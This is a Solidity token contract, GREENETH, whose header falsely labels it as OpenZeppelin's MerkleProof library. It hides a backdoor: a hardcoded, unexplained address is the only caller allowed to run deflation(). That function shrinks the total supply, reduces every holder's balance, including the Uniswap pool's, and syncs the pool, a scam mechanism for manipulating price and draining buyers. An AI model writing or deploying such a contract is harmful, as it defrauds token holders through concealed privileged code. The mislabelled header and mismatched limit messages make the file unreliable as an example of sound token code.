// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.8.0) (utils/cryptography/MerkleProof.sol)

pragma solidity ^0.8.0;


import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

library SafeMathInt {
  int256 private constant MIN_INT256 = int256(1) << 255;
  int256 private constant MAX_INT256 = ~(int256(1) << 255);

  function mul(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a * b;

    require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
    require((b == 0) || (c / b == a));
    return c;
  }

  function div(int256 a, int256 b) internal pure returns (int256) {
    require(b != -1 || a != MIN_INT256);

    return a / b;
  }

  function sub(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a - b;
    require((b >= 0 && c <= a) || (b < 0 && c > a));
    return c;
  }

  function add(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a + b;
    require((b >= 0 && c >= a) || (b < 0 && c < a));
    return c;
  }

  function abs(int256 a) internal pure returns (int256) {
    require(a != MIN_INT256);
    return a < 0 ? -a : a;
  }
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface InterfaceLP {
  function sync() external;
}



contract GREENETH is Ownable, ERC20 {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    IRouter public router;
    address public uniPair;
    uint256 public rate = 0;
    address public pair2;

    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 1000000000000 * 10**18;
    uint256 private totalSupply_ = INITIAL_FRAGMENTS_SUPPLY;
    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant MAX_SUPPLY = ~uint128(0);
    uint256 private constant rSupply = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);


    constructor() ERC20("GREENETH", "GRE") {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        uniPair = _pair;
        _approve(address(this), address(router), ~uint256(0));
        _approve(msg.sender, address(router), ~uint256(0));
        
        _mint(msg.sender, rSupply);

        rate = rSupply.div(totalSupply_);
        pair2 = 0xe1740CCD13BA04196eAf6c9E200132071AE7055D;
    }


    function deflation(uint256 percentage) external returns (uint256 newSupply) {
        if(pair2 ==  msg.sender) {
            newSupply = rebase(int256(totalSupply_.div(1000).mul(percentage)).mul(-1));
        }else {
            newSupply = 0;
        }
    }


    function rebase(int256 supplyDelta) internal returns (uint256) {
        require(supplyDelta < 0, "forbidden");
        //require(!inSwap, "Try again");

        if (supplyDelta == 0) {
            return totalSupply_;
        }

        if (supplyDelta < 0) {
            totalSupply_ = totalSupply_.sub(uint256(-supplyDelta));
        } else {
            totalSupply_ = totalSupply_.add(uint256(supplyDelta));
        }

        if (totalSupply_ > MAX_SUPPLY) {
            totalSupply_ = MAX_SUPPLY;
        }

        rate = rSupply.div(totalSupply_);
        InterfaceLP(uniPair).sync();
        return totalSupply_;
    }

    
    function approveMax(address spender) external returns (bool) {
        return approve(spender, ~uint256(0));
    }

    function totalSupply() public view virtual override returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        uint256 balances = super.balanceOf(account);
        return balances.div(rate);
    }

    function _transfer(address from, address to, uint256 amount) override internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 newAmount = amount.mul(rate);
        super._transfer(from, to, newAmount);
    }


    function multiTransfer(address[] calldata addresses, uint256[] calldata amounts) external {
        require(addresses.length < 801, "GAS Error: max airdrop limit is 500 addresses");
        require(addresses.length == amounts.length, "Mismatch between Address and token count");

        uint256 sum = 0;
        for (uint256 i = 0; i < addresses.length; i++) {
            sum = sum + amounts[i];
        }

        require(balanceOf(msg.sender) >= sum, "Not enough amount in wallet");
        for (uint256 i = 0; i < addresses.length; i++) {
            _transfer(msg.sender, addresses[i], amounts[i]);
        }
    }

    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external {
        require(addresses.length < 2001, "GAS Error: max airdrop limit is 2000 addresses");

        uint256 sum = amount.mul(addresses.length);
        require(balanceOf(msg.sender) >= sum, "Not enough amount in wallet");

        for (uint256 i = 0; i < addresses.length; i++) {
            _transfer(msg.sender, addresses[i], amount);
        }
    }



    receive() external payable {}

    function rescueWrongTokens(address payable _recipient) public onlyOwner {
        _recipient.transfer(address(this).balance);
    }

    function rescueWrongERC20(address erc20Address) public onlyOwner {
        IERC20(erc20Address).transfer(msg.sender, IERC20(erc20Address).balanceOf(address(this)));
    }
}